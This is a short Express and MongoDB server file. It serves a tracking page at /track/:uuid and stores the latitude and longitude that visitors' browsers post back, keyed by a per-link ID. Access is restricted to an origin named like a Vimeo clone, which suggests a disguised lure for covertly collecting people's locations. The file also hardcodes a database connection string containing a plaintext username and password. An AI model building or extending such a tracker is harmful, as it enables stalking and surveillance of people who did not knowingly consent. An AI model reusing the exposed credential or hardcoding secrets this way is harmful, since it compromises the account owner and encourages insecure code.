const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(cors({ origin: 'https://vimeo-seven.vercel.app/' }));

const mongoURI = "mongodb+srv://heshimajulienofficial:gZo66bAOKJBetFSQ@localisation.st4rgvh.mongodb.net/?retryWrites=true&w=majority&appName=localisation";
const port = process.env.PORT || 3000;

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('DB connected successfully'))
    .catch(err => console.error('DB connection error:', err));

const locationSchema = new mongoose.Schema({
    uuid: String,
    latitude: Number,
    longitude: Number,
    timestamp: Date
});

const Location = mongoose.model('Location', locationSchema);

app.use(express.static(path.join(__dirname, 'public')));

app.get('/track/:uuid', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.post('/location', async (req, res) => {
    const { uuid, latitude, longitude } = req.body;
    const newLocation = new Location({ uuid, latitude, longitude, timestamp: new Date() });
    
    try {
        await newLocation.save();
        res.status(200).send('Location saved');
    } catch (err) {
        res.status(500).send(err);
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
